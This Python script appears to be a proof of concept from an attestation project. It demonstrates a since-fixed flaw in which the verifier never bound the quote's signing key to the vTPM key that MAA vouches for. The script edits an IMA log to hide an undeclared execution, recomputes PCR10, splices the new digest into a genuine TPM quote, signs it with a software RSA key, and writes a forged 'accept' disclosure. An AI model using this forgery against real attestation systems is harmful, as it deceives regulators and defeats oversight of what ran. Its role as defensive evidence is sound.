"""Forge a completeness disclosure that hides an undeclared execution, and show which verifier accepts it.

Why this file exists. Up to 2026-09-14 the Tier 1 ceremony created its own attestation key with
`tpm2_createak`, and `verify_completeness.py` checked the quote against whatever public key the bundle
named. Nothing tied that key to the vTPM that the platform attestation (MAA) vouches for: the MAA token
carries the vTPM's own attestation key as `HCLAkPub`, and the ceremony's key was never compared to it.
A TPM restricted key cannot sign a structure that starts with TPM_GENERATED_VALUE unless the TPM built
it, but that protection means nothing if the verifier cannot tell the key is a TPM key at all. A software
key signs anything.

So an operator holding a genuine reject bundle can:
  1. delete the undeclared entry from the exported measurement log,
  2. replay the edited log to get the register value it would have produced,
  3. copy the real quote structure, put the regulator's challenge and the new digest in it,
  4. sign it with a key it generated in software,
  5. write an accept disclosure naming that key,
and, on a machine it controls, request MAA and NRAS tokens whose nonce is the hash of that forged
disclosure. Both services only attest that a genuine machine asked for a token over that value.

This script performs steps 1 to 5 against the retained undeclared-exec bundle and writes the forged
bundle to --out. Run the verifier on it afterwards; the expected results are in the evidence README.

Usage:
  python forge_quote_demo.py --bundle gpuout/collect/tier1/undeclared-exec \
      --approved gpuout/collect/approved --out <dir>
"""

import argparse
import hashlib
import json
import shutil
import struct
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from lib_ima import parse_binary_log
from lib_tpm import composite_digest, parse_attest, selected_pcrs
from lib_verdict import find_window


def raw_entries(blob):
    """Yield (start, end) byte offsets of each entry in a binary IMA log."""
    off, n = 0, len(blob)
    while off + 28 <= n:
        start = off
        off += 4 + 20
        (name_len,) = struct.unpack_from("<I", blob, off)
        off += 4 + name_len
        (data_len,) = struct.unpack_from("<I", blob, off)
        off += 4 + data_len
        yield start, off


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bundle", required=True)
    ap.add_argument("--approved", required=True)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    src, out = Path(args.bundle), Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    blob = (src / "ima.bin").read_bytes()
    entries = parse_binary_log(blob)
    spans = list(raw_entries(blob))
    assert len(spans) == len(entries)

    baseline = json.loads(Path(args.approved, "baseline.json").read_text())
    declaration = json.loads(Path(args.approved, "declaration.json").read_text())
    approved = set(baseline["digests"]) | set(declaration["digests"])
    if declaration.get("weights_sha256"):
        approved.add("sha256::" + declaration["weights_sha256"])

    real_quote = (src / "quote.msg").read_bytes()
    att = parse_attest(real_quote)
    challenge = (src / "challenge.txt").read_text().strip()

    # The genuine prefix the real quote covered, so the forgery keeps the same window. Newer bundles
    # quote PCRs 0 to 10; their boot register values are kept exactly as they were.
    boot_values = {}
    if (src / "boot-pcrs.json").exists():
        bank = json.loads((src / "boot-pcrs.json").read_text())["sha256"]
        boot_values = {int(k): bytes.fromhex(v) for k, v in bank.items()}
        shutil.copy(src / "boot-pcrs.json", out / "boot-pcrs.json")
    covered, _ = find_window(entries, att, boot_values)
    assert covered is not None, "the retained quote does not match its own log"

    # Step 1: drop every entry in the window whose digest is not approved.
    hidden = [i for i, e in enumerate(entries[:covered])
              if (d := e.file_digest_and_path()[0]) is not None and d not in approved]
    kept = [i for i in range(len(entries)) if i not in set(hidden)]
    forged_log = b"".join(blob[spans[i][0]:spans[i][1]] for i in kept)
    (out / "ima.bin").write_bytes(forged_log)

    # Step 2: replay the edited window.
    window = [entries[i] for i in kept if i < covered]
    pcr = bytes(32)
    for e in window:
        if e.pcr == 10:
            pcr = hashlib.sha256(pcr + e.bank_digest("sha256")).digest()
    checked = sum(1 for e in window if e.file_digest_and_path()[0] is not None)

    # Step 3: the real quote structure with the challenge and the new digest spliced in.
    o = 4 + 2
    (signer_len,) = struct.unpack_from(">H", real_quote, o); o += 2 + signer_len
    (extra_len,) = struct.unpack_from(">H", real_quote, o)
    extra_start = o + 2
    assert real_quote[extra_start:extra_start + extra_len].hex() == challenge
    digest_start = len(real_quote) - 32
    assert struct.unpack_from(">H", real_quote, digest_start - 2)[0] == 32
    sel = selected_pcrs(att["selections"])
    new_digest = composite_digest([pcr if i == 10 else boot_values[i] for i in sel])
    forged_quote = real_quote[:digest_start] + new_digest
    (out / "quote.msg").write_bytes(forged_quote)

    # Step 4: a software key, serialized as a TPMT_SIGNATURE (RSASSA, SHA-256).
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    sig = key.sign(forged_quote, padding.PKCS1v15(), hashes.SHA256())
    (out / "quote.sig").write_bytes(struct.pack(">HHH", 0x0014, 0x000B, len(sig)) + sig)
    pem = key.public_key().public_bytes(serialization.Encoding.PEM,
                                        serialization.PublicFormat.SubjectPublicKeyInfo)
    (out / "ak.pub.pem").write_bytes(pem)

    # Step 5: an accept disclosure consistent with everything above.
    disclosure = json.loads((src / "disclosure.json").read_text())
    disclosure.update({
        "verdict": "accept",
        "rejected_by": [],
        "undeclared_entries": 0,
        "ima_entries_checked": checked,
        "pcr10_sha256": pcr.hex(),
        "quote_sha256": hashlib.sha256(forged_quote).hexdigest(),
        "ak_pub_sha256": hashlib.sha256(pem).hexdigest(),
    })
    (out / "disclosure.json").write_text(json.dumps(disclosure, indent=2, sort_keys=True))
    shutil.copy(src / "challenge.txt", out / "challenge.txt")

    print(f"genuine window: {covered} entries, hidden: "
          + ", ".join(f"{entries[i].file_digest_and_path()[1]}" for i in hidden))
    print(f"forged window: {checked} measured entries, register {pcr.hex()[:16]}..., "
          f"signed with a 2048-bit software RSA key")
    print(f"forged bundle written to {out}")


if __name__ == "__main__":
    main()
